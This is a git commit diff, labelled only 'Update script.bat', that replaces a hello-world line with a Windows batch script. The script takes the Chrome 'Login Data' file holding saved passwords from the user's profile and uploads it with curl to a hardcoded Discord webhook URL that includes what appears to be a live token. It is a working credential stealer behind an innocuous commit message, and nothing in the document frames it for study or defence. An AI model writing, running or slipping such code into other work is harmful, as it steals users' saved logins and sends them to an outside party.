cd3a87489c4775e4bf0daa27aa0c71ff9e832841
Goldo1236 <96495156+Goldo1236@users.noreply.github.com>
2023-11-22 23:04:21 +0100

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,1 +1,15 @@
-echo "Bonjour, monde!"
+@echo off
+
+set "webhook_url=https://discord.com/api/webhooks/1177006144699506749/JBM_hoiJARsgmCcDM_Z1rptaRqAPYEQcbJ1fqHbeVV70qcf-ILivPgdwgcfs8-hVA5Ba"
+set "chrome_login_data=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+
+REM Envoyer le fichier via le webhook Discord
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%chrome_login_data%" %webhook_url%
+
+if %errorlevel% neq 0 (
+    echo Failed to send file to Discord.
+) else (
+    echo File sent successfully to Discord.
+)
+
+pause
